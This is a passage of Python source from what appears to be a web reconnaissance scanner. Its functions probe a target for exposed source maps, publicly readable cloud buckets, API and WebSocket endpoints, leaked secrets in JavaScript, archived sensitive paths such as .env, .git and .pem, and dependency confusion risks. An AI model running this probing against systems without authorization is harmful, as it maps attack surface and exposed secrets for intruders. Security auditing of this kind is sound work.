    found_maps: List[Dict[str, Any]] = []

    # 1. Extract sourceMappingURL references from body
    map_refs = re.findall(r'//[#@]\s*sourceMappingURL=(\S+)', body)
    # Also check for .js.map or .css.map links
    map_refs += re.findall(r'(?:src|href)=["\']([^"\']*\.(?:js|css)\.map)', body, re.I)

    # 2. Extract JS file paths and try .map suffix
    js_files = re.findall(r'(?:src)=["\']([^"\']*\.js(?:\?[^"\']*)?)["\']', body, re.I)
    for js in js_files[:10]:
        map_path = js.split("?")[0] + ".map"
        if map_path not in map_refs:
            map_refs.append(map_path)

    # 3. Probe each map file
    probed: set = set()
    for ref in map_refs[:15]:
        if ref.startswith("data:"):
            continue
        if ref.startswith("http"):
            url = ref
        elif ref.startswith("/"):
            url = f"{base}{ref}"
        else:
            url = f"{base}/{ref}"
        if url in probed:
            continue
        probed.add(url)

        try:
            status, map_body, hdrs = _fetch_url(url, timeout=timeout, verify_ssl=True,
                                                  headers=extra_headers)
            if status == 0 and use_ssl:
                status, map_body, hdrs = _fetch_url(url, timeout=timeout, verify_ssl=False,
                                                      headers=extra_headers)
        except Exception:
            continue

        if status == 200 and map_body:
            ct = hdrs.get("content-type", "")
            is_map = ("json" in ct or "sourcemap" in ct or
                      map_body.strip().startswith("{") and '"sources"' in map_body[:500])
            if is_map:
                # Extract source file list
                try:
                    map_data = json.loads(map_body[:100000])
                    sources = map_data.get("sources", [])
                    found_maps.append({
                        "url": url,
                        "sources_count": len(sources),
                        "sources_preview": sources[:5],
                        "size": len(map_body),
                    })
                except Exception:
                    found_maps.append({"url": url, "size": len(map_body)})

    return {
        "exposed": found_maps,
        "total": len(found_maps),
        "severity": "medium" if found_maps else "info",
        "description": "Source maps expose original source code, variable names, and internal paths" if found_maps else "",
    }


# ---------------------------------------------------------------------------
# Cloud Bucket Detection (#5, #130, #131, #132)
# ---------------------------------------------------------------------------

def check_cloud_buckets(host: str, timeout: int = 5,
                        extra_headers: Optional[Dict[str, str]] = None,
                        body: str = "",
                        ) -> Dict[str, Any]:
    """Enumerate and check permissions on cloud storage buckets (S3, Azure Blob, GCS).

    Discovers buckets from DNS, page content, and common naming patterns,
    then checks each for public read/list access.
    """
    from fray.recon.http import _fetch_url
    import concurrent.futures

    domain = host.replace("www.", "")
    base_name = domain.split(".")[0]  # e.g. "softbank" from "softbank.jp"

    found_buckets: List[Dict[str, Any]] = []
    seen: set = set()

    # Generate candidate bucket names
    candidates: List[Tuple[str, str, str]] = []  # (url, name, provider)

    # S3 patterns (#130)
    s3_names = [base_name, f"{base_name}-assets", f"{base_name}-static",
                f"{base_name}-media", f"{base_name}-backup", f"{base_name}-data",
                f"{base_name}-public", f"{base_name}-private", f"{base_name}-uploads",
                f"{base_name}-prod", f"{base_name}-staging", f"{base_name}-dev"]
    for name in s3_names:
        candidates.append((f"https://{name}.s3.amazonaws.com", name, "aws_s3"))
        candidates.append((f"https://s3.amazonaws.com/{name}", name, "aws_s3"))

    # Azure Blob patterns (#131)
    for name in [base_name, f"{base_name}storage", f"{base_name}data"]:
        candidates.append((f"https://{name}.blob.core.windows.net", name, "azure_blob"))
        candidates.append((f"https://{name}.blob.core.windows.net/$web", name, "azure_blob"))

    # GCS patterns (#132)
    for name in [base_name, f"{base_name}-assets", f"{base_name}-public"]:
        candidates.append((f"https://storage.googleapis.com/{name}", name, "gcs"))
        candidates.append((f"https://{name}.storage.googleapis.com", name, "gcs"))

    # Wasabi Object Storage patterns (#133)
    for name in [base_name, f"{base_name}-assets", f"{base_name}-backup"]:
        for region in ["us-east-1", "us-west-1", "eu-central-1", "ap-northeast-1",
                       "ap-northeast-2", "ap-southeast-1"]:
            candidates.append((f"https://s3.{region}.wasabisys.com/{name}", name, "wasabi"))
        candidates.append((f"https://{name}.s3.wasabisys.com", name, "wasabi"))

    # Oracle Cloud Object Storage patterns (#134)
    for name in [base_name, f"{base_name}-bucket", f"{base_name}-data"]:
        for region in ["ap-tokyo-1", "ap-osaka-1", "us-ashburn-1", "eu-frankfurt-1"]:
            ns = "placeholder"  # namespace varies — just check for references in body
            candidates.append((
                f"https://objectstorage.{region}.oraclecloud.com/n/{ns}/b/{name}/o",
                name, "oracle_oci"
            ))

    # Sakura Object Storage (Japan) patterns (#135)
    for name in [base_name, f"{base_name}-storage", f"{base_name}-assets"]:
        candidates.append((f"https://{name}.b.sakurastorage.jp", name, "sakura"))
        candidates.append((f"https://b.sakurastorage.jp/{name}", name, "sakura"))

    # Also check for bucket references in page body
    s3_refs = re.findall(r'([a-z0-9][a-z0-9.\-]{1,62})\.s3[.\-]amazonaws\.com', body, re.I)
    for ref in s3_refs[:5]:
        if ref not in seen:
            candidates.append((f"https://{ref}.s3.amazonaws.com", ref, "aws_s3"))
    azure_refs = re.findall(r'([a-z0-9]{3,24})\.blob\.core\.windows\.net', body, re.I)
    for ref in azure_refs[:5]:
        candidates.append((f"https://{ref}.blob.core.windows.net", ref, "azure_blob"))
    gcs_refs = re.findall(r'storage\.googleapis\.com/([a-z0-9][a-z0-9.\-_]{1,62})', body, re.I)
    for ref in gcs_refs[:5]:
        candidates.append((f"https://storage.googleapis.com/{ref}", ref, "gcs"))
    # Wasabi refs in page body
    wasabi_refs = re.findall(r'([a-z0-9][a-z0-9.\-]{1,62})\.s3\.wasabisys\.com', body, re.I)
    for ref in wasabi_refs[:3]:
        candidates.append((f"https://{ref}.s3.wasabisys.com", ref, "wasabi"))
    # Oracle OCI refs in page body
    oci_refs = re.findall(r'objectstorage\.[a-z0-9\-]+\.oraclecloud\.com/n/([^/]+)/b/([^/]+)', body, re.I)
    for ns, bname in oci_refs[:3]:
        candidates.append((f"https://objectstorage.ap-tokyo-1.oraclecloud.com/n/{ns}/b/{bname}/o", bname, "oracle_oci"))
    # Sakura refs in page body
    sakura_refs = re.findall(r'([a-z0-9][a-z0-9.\-]{1,62})\.b\.sakurastorage\.jp', body, re.I)
    for ref in sakura_refs[:3]:
        candidates.append((f"https://{ref}.b.sakurastorage.jp", ref, "sakura"))

    def _check_bucket(url: str, name: str, provider: str) -> Optional[Dict[str, Any]]:
        if url in seen:
            return None
        seen.add(url)
        try:
            status, resp_body, hdrs = _fetch_url(url, timeout=timeout, verify_ssl=True)
        except Exception:
            return None

        entry: Dict[str, Any] = {"name": name, "provider": provider, "url": url, "status": status}

        if status == 200:
            # Check if listing is enabled
            if "<ListBucketResult" in (resp_body or "") or "<EnumerationResults" in (resp_body or ""):
                entry["public_listing"] = True
                entry["severity"] = "critical"
                # Count objects
                keys = re.findall(r'<Key>([^<]+)</Key>', resp_body or "")
                entry["objects_preview"] = keys[:5]
                entry["objects_count"] = len(keys)
            else:
                entry["public_read"] = True
                entry["severity"] = "high"
            return entry
        elif status == 403:
            entry["exists"] = True
            entry["public_read"] = False
            entry["severity"] = "info"
            return entry
        # 404 = doesn't exist, skip
        return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as pool:
        futures = {pool.submit(_check_bucket, url, name, prov): (url, name, prov)
                   for url, name, prov in candidates}
        for f in concurrent.futures.as_completed(futures, timeout=timeout * 4):
            try:
                r = f.result()
                if r:
                    found_buckets.append(r)
            except Exception:
                pass

    public = [b for b in found_buckets if b.get("public_listing") or b.get("public_read")]
    return {
        "buckets": found_buckets,
        "total_found": len(found_buckets),
        "public_buckets": public,
        "total_public": len(public),
        "providers_checked": ["aws_s3", "azure_blob", "gcs"],
        "severity": "critical" if any(b.get("public_listing") for b in found_buckets) else
                    "high" if public else "info",
    }


# ---------------------------------------------------------------------------
# JS Analysis (#1, #8, #10)
# ---------------------------------------------------------------------------

_JS_ENDPOINT_PATTERNS = [
    # Fetch / axios / XMLHttpRequest calls
    re.compile(r'''(?:fetch|axios\.(?:get|post|put|delete|patch))\s*\(\s*[`"']([/][^`"'\s]{3,})[`"']''', re.I),
    # String URLs
    re.compile(r'''["\'](/api/[^"'\s]{2,})["\']'''),
    re.compile(r'''["\'](/v[12]/[^"'\s]{2,})["\']'''),
    re.compile(r'''["\'](https?://[^"'\s]{10,})["\']'''),
    # Route definitions (React Router, Vue Router, Express)
    re.compile(r'''path\s*:\s*["\'](/[^"'\s]{2,})["\']'''),
    re.compile(r'''(?:app|router)\.\s*(?:get|post|put|delete|patch|use)\s*\(\s*["\']([/][^"'\s]{2,})["\']''', re.I),
    # GraphQL endpoints
    re.compile(r'''["\']([^"'\s]*graphql[^"'\s]*)["\']''', re.I),
    # WebSocket URLs
    re.compile(r'''["\']([^"'\s]*wss?://[^"'\s]+)["\']''', re.I),
]


def check_js_endpoints(host: str, port: int, use_ssl: bool,
                       timeout: int = 5,
                       extra_headers: Optional[Dict[str, str]] = None,
                       body: str = "",
                       ) -> Dict[str, Any]:
    """Extract endpoints from page source and linked JS files (#1).

    Finds API endpoints, routes, fetch calls, and hidden paths from
    HTML body and referenced JavaScript bundles.
    """
    from fray.recon.http import _fetch_url
    import concurrent.futures

    scheme = "https" if use_ssl else "http"
    port_str = "" if (use_ssl and port == 443) or (not use_ssl and port == 80) else f":{port}"
    base = f"{scheme}://{host}{port_str}"

    endpoints: set = set()
    websocket_urls: set = set()
    file_upload_forms: List[Dict[str, Any]] = []

    def _extract_from_source(source: str, source_url: str = ""):
        """Extract endpoints from a chunk of JS/HTML source."""
        for pat in _JS_ENDPOINT_PATTERNS:
            for m in pat.finditer(source):
                ep = m.group(1)
                if ep.startswith("ws://") or ep.startswith("wss://"):
                    websocket_urls.add(ep)
                else:
                    # Filter out obvious non-endpoints
                    if not any(ep.endswith(ext) for ext in (".png", ".jpg", ".gif", ".css", ".svg", ".ico", ".woff", ".woff2", ".ttf", ".eot")):
                        endpoints.add(ep)

    # Phase 1: Extract from main page body
    _extract_from_source(body, base)

    # Phase 1b: Check for file upload forms (#8)
    file_inputs = re.findall(r'<form[^>]*>(.*?)</form>', body, re.S | re.I)
    for form in file_inputs:
        if re.search(r'type=["\']file["\']', form, re.I) or 'multipart/form-data' in form.lower():
            action = re.search(r'action=["\']([^"\']+)["\']', form, re.I)
            method = re.search(r'method=["\']([^"\']+)["\']', form, re.I)
            file_upload_forms.append({
                "action": action.group(1) if action else "",
                "method": (method.group(1) if method else "POST").upper(),
            })
    # Also check for JS-based file upload (Dropzone, etc.)
    if re.search(r'Dropzone|dropzone|FileReader|formData\.append.*file|input.*type.*file', body, re.I):
        file_upload_forms.append({"action": "(JS-based upload)", "method": "POST"})

    # Phase 1c: Check for WebSocket usage (#10)
    ws_patterns = [
        re.compile(r'new\s+WebSocket\s*\(\s*["\']([^"\']+)["\']', re.I),
        re.compile(r'(?:io|socket)\s*\(\s*["\']([^"\']+)["\']', re.I),  # Socket.IO
        re.compile(r'SockJS\s*\(\s*["\']([^"\']+)["\']', re.I),
    ]
    for pat in ws_patterns:
        for m in pat.finditer(body):
            websocket_urls.add(m.group(1))

    # Phase 2: Fetch and analyze linked JS files
    js_srcs = re.findall(r'<script[^>]+src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', body, re.I)
    # Prioritize first-party JS
    first_party = [s for s in js_srcs if host in s or s.startswith("/")]
    third_party = [s for s in js_srcs if s not in first_party]
    js_to_fetch = first_party[:8] + third_party[:2]  # Limit to 10 files

    def _fetch_js(src: str) -> str:
        if src.startswith("//"):
            url = f"{scheme}:{src}"
        elif src.startswith("/"):
            url = f"{base}{src}"
        elif src.startswith("http"):
            url = src
        else:
            url = f"{base}/{src}"
        try:
            status, js_body, _ = _fetch_url(url, timeout=timeout, verify_ssl=True,
                                              headers=extra_headers)
            if status == 0 and use_ssl:
                status, js_body, _ = _fetch_url(url, timeout=timeout, verify_ssl=False,
                                                  headers=extra_headers)
            return js_body if status == 200 else ""
        except Exception:
            return ""

    # Also scan JS files for exposed secrets (API keys, tokens, credentials)
    embedded_secrets: List[Dict[str, Any]] = []

    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as pool:
        futures = {pool.submit(_fetch_js, src): src for src in js_to_fetch}
        for f in concurrent.futures.as_completed(futures, timeout=timeout * 3):
            try:
                js_body = f.result()
                if js_body:
                    js_src = futures[f]
                    _extract_from_source(js_body, js_src)
                    # ── Scan JS content for secrets ───────────────────────
                    js_secrets = check_secrets_in_response(js_body, url=js_src)
                    if js_secrets.get("findings"):
                        for finding in js_secrets["findings"]:
                            finding["source"] = "js_file"
                            finding["js_file"] = js_src
                            embedded_secrets.append(finding)
            except Exception:
                pass

    # Also scan the main page body for secrets (embed links, config vars)
    if body:
        page_secrets = check_secrets_in_response(body, url=f"{base}/")
        for finding in page_secrets.get("findings", []):
            finding["source"] = "page_body"
            embedded_secrets.append(finding)

    # Deduplicate by type+masked_value
    seen_secrets: set = set()
    deduped_secrets = []
    for s in embedded_secrets:
        key = (s.get("type", ""), s.get("masked_value", ""))
        if key not in seen_secrets:
            seen_secrets.add(key)
            deduped_secrets.append(s)

    # Categorize endpoints
    api_endpoints = sorted(ep for ep in endpoints if "/api" in ep.lower() or "/v1" in ep.lower() or "/v2" in ep.lower())
    internal_paths = sorted(ep for ep in endpoints if ep.startswith("/") and ep not in api_endpoints)
    external_urls = sorted(ep for ep in endpoints if ep.startswith("http"))

    return {
        "total_endpoints": len(endpoints),
        "api_endpoints": api_endpoints[:30],
        "internal_paths": internal_paths[:30],
        "external_urls": external_urls[:20],
        "websocket_urls": sorted(websocket_urls),
        "file_upload_forms": file_upload_forms,
        "js_files_analyzed": len(js_to_fetch),
        "has_websockets": bool(websocket_urls),
        "has_file_upload": bool(file_upload_forms),
        # Secrets found in JS files and page body
        "secrets": deduped_secrets,
        "has_secrets": bool(deduped_secrets),
        "secret_vendors": list({s.get("vendor", "") for s in deduped_secrets if s.get("vendor")}),
    }


# ---------------------------------------------------------------------------
# #2  Wayback Machine Historical URL Discovery
# ---------------------------------------------------------------------------

def check_wayback_urls(host: str, timeout: int = 10,
                       limit: int = 500,
                       ) -> Dict[str, Any]:
    """Fetch historical URLs from the Wayback Machine CDX API.

    Returns unique paths grouped by type (api, admin, auth, static, other)
    with metadata about status codes and timestamps.
    """
    import urllib.request
    import urllib.error

    cdx_url = (
        f"https://web.archive.org/cdx/search/cdx"
        f"?url={host}/*&output=json&fl=original,statuscode,timestamp,mimetype"
        f"&collapse=urlkey&limit={limit}&filter=statuscode:200"
    )

    result: Dict[str, Any] = {
        "total_urls": 0,
        "unique_paths": [],
        "api_paths": [],
        "admin_paths": [],
        "auth_paths": [],
        "config_paths": [],
        "interesting_files": [],
        "parameters_found": [],
        "source": "web.archive.org",
    }

    try:
        req = urllib.request.Request(cdx_url, headers={
            "User-Agent": "Mozilla/5.0 (compatible; Fray/1.0; +https://github.com/dalisecurity/Fray)",
        })
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read().decode("utf-8", errors="replace")
    except Exception:
        result["error"] = "Wayback Machine unreachable or timed out"
        return result

    try:
        rows = json.loads(raw)
    except Exception:
        result["error"] = "Invalid JSON from CDX API"
        return result

    if not rows or len(rows) < 2:
        return result

    # First row is header: [original, statuscode, timestamp, mimetype]
    seen_paths: set = set()
    api_paths: List[str] = []
    admin_paths: List[str] = []
    auth_paths: List[str] = []
    config_paths: List[str] = []
    interesting_files: List[str] = []
    params_found: set = set()
    all_paths: List[str] = []

    _API_KW = {"api", "v1", "v2", "v3", "graphql", "rest", "json", "xml", "rpc"}
    _ADMIN_KW = {"admin", "dashboard", "panel", "manage", "console", "backend",
                 "phpmyadmin", "adminer", "cpanel", "wp-admin", "manager"}
    _AUTH_KW = {"login", "signin", "sign-in", "auth", "oauth", "sso", "register",
                "signup", "password", "forgot", "reset", "token", "session"}
    _CONFIG_KW = {".env", ".git", "config", "settings", "web.config", ".htaccess",
                  "wp-config", "database", ".yaml", ".yml", ".toml", ".ini"}
    _INTERESTING_EXT = {".sql", ".bak", ".old", ".backup", ".zip", ".tar",
                        ".gz", ".log", ".csv", ".xls", ".xlsx", ".doc",
                        ".pdf", ".key", ".pem", ".p12"}

    for row in rows[1:]:
        if len(row) < 2:
            continue
        url = row[0]
        try:
            parsed = urllib.parse.urlparse(url)
            path = parsed.path.rstrip("/") or "/"
        except Exception:
            continue

        if path in seen_paths:
            continue
        seen_paths.add(path)
        all_paths.append(path)

        lower = path.lower()

        # Extract query parameters
        if parsed.query:
            for param in parsed.query.split("&"):
                pname = param.split("=")[0]
                if pname and len(pname) < 50:
                    params_found.add(pname)

        # Classify
        segments = set(lower.split("/"))
        if segments & _API_KW or "/api" in lower:
            api_paths.append(path)
        if segments & _ADMIN_KW:
            admin_paths.append(path)
        if segments & _AUTH_KW:
            auth_paths.append(path)
        if any(kw in lower for kw in _CONFIG_KW):
            config_paths.append(path)
        if any(lower.endswith(ext) for ext in _INTERESTING_EXT):
            interesting_files.append(path)

    result["total_urls"] = len(all_paths)
    result["unique_paths"] = sorted(all_paths)[:200]
    result["api_paths"] = sorted(set(api_paths))[:50]
    result["admin_paths"] = sorted(set(admin_paths))[:30]
    result["auth_paths"] = sorted(set(auth_paths))[:20]
    result["config_paths"] = sorted(set(config_paths))[:20]
    result["interesting_files"] = sorted(set(interesting_files))[:20]
    result["parameters_found"] = sorted(params_found)[:50]

    return result


# ---------------------------------------------------------------------------
# #11  Server-Sent Events (SSE) Endpoint Detection
# ---------------------------------------------------------------------------

def check_sse_endpoints(host: str, port: int, use_ssl: bool,
                        timeout: int = 5,
                        extra_headers: Optional[Dict[str, str]] = None,
                        body: str = "",
                        ) -> Dict[str, Any]:
    """Detect Server-Sent Events (SSE) endpoints from page source and headers.

    Looks for EventSource usage in JS, text/event-stream content-type,
    and common SSE path patterns.
    """
    from fray.recon.http import _fetch_url

    scheme = "https" if use_ssl else "http"
    port_str = "" if (use_ssl and port == 443) or (not use_ssl and port == 80) else f":{port}"
    base = f"{scheme}://{host}{port_str}"

    sse_endpoints: List[Dict[str, str]] = []
    seen: set = set()

    # Phase 1: Extract EventSource URLs from body
    es_patterns = [
        re.compile(r'new\s+EventSource\s*\(\s*["\']([^"\']+)["\']', re.I),
        re.compile(r'EventSource\s*\(\s*["\']([^"\']+)["\']', re.I),
        re.compile(r'text/event-stream["\s,;]', re.I),
    ]
    for pat in es_patterns[:2]:
        for m in pat.finditer(body):
            url = m.group(1)
            if url not in seen:
                seen.add(url)
                sse_endpoints.append({"url": url, "source": "js_eventsource"})

    # Phase 2: Probe common SSE paths
    _SSE_PATHS = [
        "/events", "/sse", "/stream", "/api/events", "/api/stream",
        "/api/v1/events", "/api/sse", "/notifications/stream",
        "/live", "/feed/stream", "/realtime",
    ]
    for path in _SSE_PATHS:
        if path in seen:
            continue
        url = f"{base}{path}"
        try:
            status, resp_body, hdrs = _fetch_url(url, timeout=min(timeout, 3),
                                                   verify_ssl=True,
                                                   headers=extra_headers)
            if status == 0 and use_ssl:
                status, resp_body, hdrs = _fetch_url(url, timeout=min(timeout, 3),
                                                       verify_ssl=False,
                                                       headers=extra_headers)
        except Exception:
            continue

        ct = hdrs.get("content-type", "")
        if "text/event-stream" in ct:
            seen.add(path)
            sse_endpoints.append({"url": path, "source": "probe", "status": status})
        elif status in (200, 401, 403) and resp_body:
            lower = resp_body[:500].lower()
            if "event:" in lower or "data:" in lower or "retry:" in lower:
                seen.add(path)
                sse_endpoints.append({"url": path, "source": "probe_body", "status": status})

    return {
        "sse_endpoints": sse_endpoints,
        "total_found": len(sse_endpoints),
        "has_sse": bool(sse_endpoints),
    }


# ---------------------------------------------------------------------------
# #6  API Endpoint Auto-Classification (REST / GraphQL / gRPC)
# ---------------------------------------------------------------------------

def classify_api_endpoints(api_security_data: Dict[str, Any],
                           graphql_data: Dict[str, Any],
                           ) -> Dict[str, Any]:
    """Classify discovered API endpoints by protocol type.

    Takes output from check_api_security() and check_graphql_introspection()
    and returns a unified classification with protocol, version, and auth info.
    """
    classified: List[Dict[str, Any]] = []
    protocol_counts = {"rest": 0, "graphql": 0, "grpc": 0, "soap": 0, "unknown": 0}

    # From API security specs
    for spec in api_security_data.get("specs_found", []):
        path = spec.get("path", "")
        cat = spec.get("category", "")
        proto = "unknown"
        version = ""

        if cat in ("swagger", "openapi"):
            proto = "rest"
            version = spec.get("spec_version", "")
        elif cat in ("graphql", "graphiql", "altair", "graphql_playground"):
            proto = "graphql"
        elif cat == "spring_actuator":
            proto = "rest"
        elif cat == "metrics":
            proto = "rest"

        protocol_counts[proto] += 1
        classified.append({
            "path": path,
            "protocol": proto,
            "version": version,
            "endpoints_count": spec.get("endpoints_count", 0),
            "auth_schemes": spec.get("auth_schemes", []),
            "severity": spec.get("severity", "info"),
            "title": spec.get("title", ""),
        })

    # From API endpoints (non-spec)
    for ep in api_security_data.get("api_endpoints", []):
        path = ep.get("path", "")
        # Skip if already classified via spec
        if any(c["path"] == path for c in classified):
            continue

        cat = ep.get("category", "")
        proto = "unknown"

        if cat == "graphql":
            proto = "graphql"
        elif cat in ("grpc", "grpc_web"):
            proto = "grpc"
        elif cat == "soap":
            proto = "soap"
        elif cat in ("swagger", "openapi", "swagger_ui", "fastapi_docs", "redoc"):
            proto = "rest"
        elif "/api" in path.lower() or "/v1" in path.lower() or "/v2" in path.lower():
            proto = "rest"
        elif ep.get("auth_required"):
            proto = "rest"

        protocol_counts[proto] += 1
        classified.append({
            "path": path,
            "protocol": proto,
            "auth_required": ep.get("auth_required", False),
            "auth_scheme": ep.get("auth_scheme"),
            "status": ep.get("status"),
        })

    # From GraphQL introspection
    gql_endpoints = graphql_data.get("endpoints_found", [])
    gql_introspection = graphql_data.get("introspection_enabled", [])
    for gql_path in gql_endpoints:
        if any(c["path"] == gql_path for c in classified):
            # Update existing entry
            for c in classified:
                if c["path"] == gql_path:
                    c["protocol"] = "graphql"
                    c["introspection_enabled"] = gql_path in gql_introspection
                    c["types_count"] = graphql_data.get("total_types", 0)
            continue
        protocol_counts["graphql"] += 1
        classified.append({
            "path": gql_path,
            "protocol": "graphql",
            "introspection_enabled": gql_path in gql_introspection,
            "types_count": graphql_data.get("total_types", 0),
            "fields_count": graphql_data.get("total_fields", 0),
        })

    # Gateway info
    gw = api_security_data.get("api_gateway", {})
    rl = api_security_data.get("rate_limiting", {})
    auth = api_security_data.get("authentication", {})

    return {
        "classified_endpoints": classified,
        "protocol_distribution": {k: v for k, v in protocol_counts.items() if v > 0},
        "total_classified": len(classified),
        "has_rest": protocol_counts["rest"] > 0,
        "has_graphql": protocol_counts["graphql"] > 0,
        "has_grpc": protocol_counts["grpc"] > 0,
        "has_soap": protocol_counts["soap"] > 0,
        "gateway": gw,
        "rate_limiting": rl,
        "authentication": auth,
    }


# ---------------------------------------------------------------------------
# #30  Dependency Confusion Detection
# ---------------------------------------------------------------------------

# Well-known public npm scopes and packages to exclude from checks
_PUBLIC_NPM_SCOPES = frozenset({
    "@angular", "@babel", "@emotion", "@eslint", "@types", "@testing-library",
    "@aws-sdk", "@azure", "@google-cloud", "@grpc", "@nestjs", "@nuxtjs",
    "@vue", "@react-native", "@storybook", "@tanstack", "@trpc",
    "@prisma", "@mui", "@chakra-ui", "@radix-ui", "@headlessui",
    "@fortawesome", "@sentry", "@datadog", "@stripe", "@auth0",
})

_PUBLIC_NPM_PACKAGES = frozenset({
    "react", "vue", "angular", "express", "next", "nuxt", "svelte",
    "lodash", "axios", "moment", "dayjs", "date-fns", "jquery",
    "bootstrap", "tailwindcss", "webpack", "vite", "rollup", "esbuild",
    "typescript", "eslint", "prettier", "jest", "mocha", "chai",
    "graphql", "apollo", "prisma", "sequelize", "mongoose", "knex",
    "socket.io", "redis", "pg", "mysql2", "mongodb", "sqlite3",
})


def check_dependency_confusion(host: str, port: int, use_ssl: bool,
                                timeout: int = 5,
                                extra_headers: Optional[Dict[str, str]] = None,
                                body: str = "",
                                ) -> Dict[str, Any]:
    """#30 — Detect dependency confusion risks.

    Extracts package names from:
    1. package.json / package-lock.json if publicly accessible
    2. JS bundle source (webpack chunk names, require() calls)
    3. HTML body (script src attributes with scoped packages)

    Then checks if internal-looking package names (scoped @company/*
    or names containing the host) exist on the public npm registry.
    If a scoped package does NOT exist on npm, it's a dependency confusion
    candidate — an attacker could register it.

    Returns list of at-risk packages with registry status.
    """
    import urllib.request
    import urllib.error
    from fray.recon.http import _fetch_url

    scheme = "https" if use_ssl else "http"
    port_str = "" if (use_ssl and port == 443) or (not use_ssl and port == 80) else f":{port}"
    base = f"{scheme}://{host}{port_str}"

    # Derive company keywords from host
    host_parts = host.lower().replace("www.", "").split(".")
    company_kw = {p for p in host_parts if len(p) > 2 and p not in ("com", "org", "net", "io", "co", "jp", "uk", "de", "fr")}

    candidates: Dict[str, Dict[str, Any]] = {}  # pkg_name -> info
    all_packages: set = set()

    # ── Phase 1: Try to fetch package.json / package-lock.json ──
    for pkg_path in ("/package.json", "/package-lock.json"):
        try:
            status, pkg_body, _ = _fetch_url(f"{base}{pkg_path}", timeout=timeout,
                                              verify_ssl=True, headers=extra_headers)
            if status == 0 and use_ssl:
                status, pkg_body, _ = _fetch_url(f"{base}{pkg_path}", timeout=timeout,
                                                  verify_ssl=False, headers=extra_headers)
        except Exception:
            continue

        if status != 200 or not pkg_body or not pkg_body.strip().startswith("{"):
            continue

        try:
            pkg_data = json.loads(pkg_body[:500000])
            # Extract dependency names
            for dep_key in ("dependencies", "devDependencies", "peerDependencies",
                            "optionalDependencies"):
                deps = pkg_data.get(dep_key, {})
                if isinstance(deps, dict):
                    all_packages.update(deps.keys())
            # package-lock has "packages" with nested deps
            if "packages" in pkg_data:
                for pkg_name in pkg_data["packages"]:
                    if pkg_name.startswith("node_modules/"):
                        name = pkg_name.replace("node_modules/", "", 1)
                        if name:
                            all_packages.add(name)
        except Exception:
            pass

    # ── Phase 2: Extract from JS bundle source ──
    # Look for webpack chunk names, scoped imports in bundles
    _SCOPE_RE = re.compile(r'(@[\w-]+/[\w.-]+)', re.I)
    _REQUIRE_RE = re.compile(r'''require\s*\(\s*['"](@?[\w-]+(?:/[\w.-]+)?)['"]''', re.I)
    _IMPORT_RE = re.compile(r'''from\s+['"](@?[\w-]+(?:/[\w.-]+)?)['"]''', re.I)

    for pat in (_SCOPE_RE, _REQUIRE_RE, _IMPORT_RE):
        for m in pat.finditer(body[:200000]):
            pkg = m.group(1)
            if pkg and not pkg.startswith("@types/"):
                all_packages.add(pkg)

    # ── Phase 3: Filter to internal-looking packages ──
    for pkg in all_packages:
        # Skip known public packages
        if pkg in _PUBLIC_NPM_PACKAGES:
            continue
        # Skip known public scopes
        scope = pkg.split("/")[0] if "/" in pkg else ""
        if scope in _PUBLIC_NPM_SCOPES:
            continue

        is_suspicious = False
        reason = ""

        # Scoped packages with company-like names
        if pkg.startswith("@"):
            scope_name = scope.lstrip("@")
            if scope_name in company_kw:
                is_suspicious = True
                reason = f"Scope @{scope_name} matches host"
            elif any(kw in scope_name for kw in company_kw):
                is_suspicious = True
                reason = f"Scope contains company keyword"
            else:
                # Any non-public scope is worth checking
                is_suspicious = True
                reason = "Private scope — potential confusion target"
        else:
            # Non-scoped packages containing company name
            pkg_lower = pkg.lower()
            for kw in company_kw:
                if kw in pkg_lower and len(kw) > 3:
                    is_suspicious = True
                    reason = f"Package name contains '{kw}'"
                    break

        if is_suspicious:
            candidates[pkg] = {"name": pkg, "reason": reason, "source": "js_bundle"}

    if not candidates:
        return {
            "packages_checked": len(all_packages),
            "at_risk": [],
            "total_at_risk": 0,
            "has_confusion_risk": False,
        }

    # ── Phase 4: Check npm registry for each candidate ──
    at_risk: List[Dict[str, Any]] = []

    for pkg_name, info in list(candidates.items())[:20]:  # Cap at 20 checks
        npm_url = f"https://registry.npmjs.org/{pkg_name}"
        exists_on_npm = None
        try:
            req = urllib.request.Request(npm_url, method="HEAD", headers={
                "User-Agent": "Mozilla/5.0 (compatible; Fray/1.0)",
            })
            with urllib.request.urlopen(req, timeout=5) as resp:
                exists_on_npm = resp.status == 200
        except urllib.error.HTTPError as e:
            exists_on_npm = False if e.code == 404 else None
        except Exception:
            exists_on_npm = None

        if exists_on_npm is False:
            # Package does NOT exist on npm — confusion risk!
            at_risk.append({
                "name": pkg_name,
                "registry": "npm",
                "exists_on_registry": False,
                "severity": "high",
                "reason": info["reason"],
                "description": (f"Package '{pkg_name}' is used internally but not registered "
                                f"on npm. An attacker could register this name and inject "
                                f"malicious code via dependency confusion."),
            })
        elif exists_on_npm is True:
            # Exists — check if it might be a squatted/suspicious package
            # (low confidence, just note it)
            info["exists_on_registry"] = True
            info["registry"] = "npm"

    # ── Phase 5: Also check PyPI for requirements.txt ──
    try:
        status, req_body, _ = _fetch_url(f"{base}/requirements.txt", timeout=timeout,
                                          verify_ssl=True, headers=extra_headers)
        if status == 200 and req_body:
            for line in req_body.splitlines():
                line = line.strip()
                if not line or line.startswith("#") or line.startswith("-"):
                    continue
                # Extract package name (before ==, >=, etc.)
                pypi_pkg = re.split(r'[>=<!\[\];]', line)[0].strip()
                if not pypi_pkg or len(pypi_pkg) < 2:
                    continue
                # Check if internal-looking
                pypi_lower = pypi_pkg.lower().replace("-", "").replace("_", "")
                for kw in company_kw:
                    if kw in pypi_lower and len(kw) > 3:
                        # Check PyPI
                        pypi_url = f"https://pypi.org/pypi/{pypi_pkg}/json"
                        try:
                            req = urllib.request.Request(pypi_url, method="HEAD", headers={
                                "User-Agent": "Mozilla/5.0 (compatible; Fray/1.0)",
                            })
                            with urllib.request.urlopen(req, timeout=5) as resp:
                                pass  # exists on PyPI, likely fine
                        except urllib.error.HTTPError as e:
                            if e.code == 404:
                                at_risk.append({
                                    "name": pypi_pkg,
                                    "registry": "pypi",
                                    "exists_on_registry": False,
                                    "severity": "high",
                                    "reason": f"Package contains '{kw}'",
                                    "description": (f"Python package '{pypi_pkg}' is used internally "
                                                    f"but not on PyPI. Dependency confusion risk."),
                                })
                        except Exception:
                            pass
                        break
    except Exception:
        pass

    return {
